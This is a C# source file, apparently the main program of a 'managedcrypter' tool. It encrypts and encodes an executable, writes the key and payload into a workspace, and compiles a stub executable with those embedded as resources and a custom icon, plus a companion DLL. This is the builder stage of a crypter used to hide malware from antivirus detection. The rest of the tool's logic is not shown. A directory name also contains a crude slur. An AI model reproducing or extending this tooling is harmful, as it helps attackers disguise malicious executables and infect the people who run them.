using managedcrypter.Compiler;
using managedcrypter.IO;
using System;
using System.IO;

namespace managedcrypter
{
    class Program
    {
        static void Main(string[] args)
        {
            CryptFile cFile = null;
            GenericDirectory sDirectory = null;
            GenericDirectory lDirectory = null;

            cFile = new CryptFile(File.ReadAllBytes("C:\\Users\\Admin\\Desktop\\Bintext.exe"));
            sDirectory = new GenericDirectory(@"C:\Users\admin\Desktop\gayassfuckingcrypter\stub");
            lDirectory = new GenericDirectory(@"C:\Users\admin\Desktop\gayassfuckingcrypter\lib");

            cFile.EncryptData();
            cFile.EncodeData();

            Console.WriteLine("Sanity Check: {0}", cFile.SanityCheck());

            Console.WriteLine("Stub Directory: {0}", sDirectory.DirectoryPath);

            foreach (string stubFile in sDirectory.Files)
                Console.WriteLine("Stub File: {0}", stubFile);

            sDirectory.CreateWorkspaceDirectory();

            /* init workspace */
            /* todo: use dictionary<string, string> to anonymize the resource names */
            var Workspace = sDirectory.Workspace;
            Workspace.AddChild("keyfile");
            Workspace.AddChild("payload");

            foreach (string workspaceFiles in Workspace.Children.Values)
                Console.WriteLine("Workspace File Initialized: {0}", workspaceFiles);

            /* write workspace files */
            Workspace.Write("keyfile", cFile.EncryptionKey);
            Workspace.Write("payload", cFile.EncodedData);

            Console.ReadLine();

            using (GenericCompiler sCompiler = new GenericCompiler())
            {
                CompilerInfo cInfo = new CompilerInfo();
                cInfo.GenerateExe = true;
                cInfo.OutputDestination = "C:\\Users\\Admin\\Desktop\\TestFile.exe";
                cInfo.IconPath = "C:\\Users\\Admin\\Desktop\\Ico.ico";

                cInfo.EmbeddedResources.AddRange(System.IO.Directory.GetFiles(Workspace.Parent));

                if (sCompiler.CompileSource(sDirectory, cInfo))
                    Console.WriteLine("Successfully compiled stub!");
            }

            Console.ReadLine();

            using (GenericCompiler lCompiler = new GenericCompiler())
            {
                CompilerInfo cInfo = new CompilerInfo();
                cInfo.GenerateLibrary = true;
                cInfo.OutputDestination = "C:\\Users\\Admin\\Desktop\\TestFile.dll";
                cInfo.IconPath = "C:\\Users\\Admin\\Desktop\\Ico.ico";

                if (lCompiler.CompileSource(lDirectory, cInfo))
                    Console.WriteLine("Successfully compiled library!");
            }


            Workspace.Clear();
        }
    }
}